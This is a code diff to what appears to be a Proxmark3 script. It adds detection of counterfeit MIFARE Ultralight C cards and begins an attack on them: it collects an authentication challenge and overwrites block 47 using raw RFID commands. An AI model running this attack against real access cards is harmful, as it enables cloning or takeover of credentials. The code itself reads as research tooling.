@@ -361,6 +361,34 @@ def get_ulc_uid(p) -> Optional[str]:
         return uid
 
 
+def is_known_counterfeit(p) -> bool:
+
+    # Feiju FJ8010
+    p.console("hf 14a raw -sc 1A2F")
+    challenge = p.grabbed_output.split()
+    if (len(challenge) > 8) and (challenge[1] == "AF"):
+        print("[+] Feiju FJ8010 detected")
+        return True
+
+    # USCUID-UL with ULC authentication
+    p.console("hf 14a raw -s 1A")
+    challenge = p.grabbed_output.split()
+    if (len(challenge) > 8) and (challenge[1] == "AF"):
+        print("[+] USCUID-UL detected")
+        return True
+
+    # Giantec GT23SC4489
+    p.console("hf 14a raw -akb 7 26", capture=False, quiet=True)
+    p.console("hf 14a raw 30")
+    challenge = p.grabbed_output.split()
+    if (len(challenge) == 21):
+        print("[+] Giantec GT23SC4489 detected")
+        return True
+
+    print("[=] Card does not match known counterfeit profiles, exiting")
+    return False
+
+
 def collect(num_challenges: int, p, debug: bool, force: bool = False, erndarndb: Optional[str] = None) -> Optional[dict]:
     """
     Collect challenges from the card and check if it is vulnerable.
@@ -401,12 +429,20 @@ def collect(num_challenges: int, p, debug: bool, force: bool = False, erndarndb:
 
     print("[+] All sanity checks \033[1;32mpassed\033[0m. Checking if card is vulnerable.\033[?25l")
 
-    max_occurrence, challenges = collect_100(num_challenges, p, early_stop=True)
-    if max_occurrence <= 1 and not force:
+    if not is_known_counterfeit(p) and not force:
         return
 
     # The card is vulnerable, proceed with attack
     # Danger zone. To reset a test card, run: hf mfu setkey -k 49454D4B41455242214E4143554F5946
+    challenges = {}
+
+    # Collect challenges (100)
+    p.console("hf 14a raw -sc 1A00")
+    challenge = p.grabbed_output.split()
+    if (len(challenge) > 8) and (challenge[1] == "AF"):
+        hex_challenge = "".join(challenge[2:10])
+        challenges["challenge_100"] = hex_challenge
+    print("\n[+] 100 collection complete")
 
     # Overwrite block 47
     p.console("hf 14a raw -sc A22F00000000", capture=False, quiet=True)
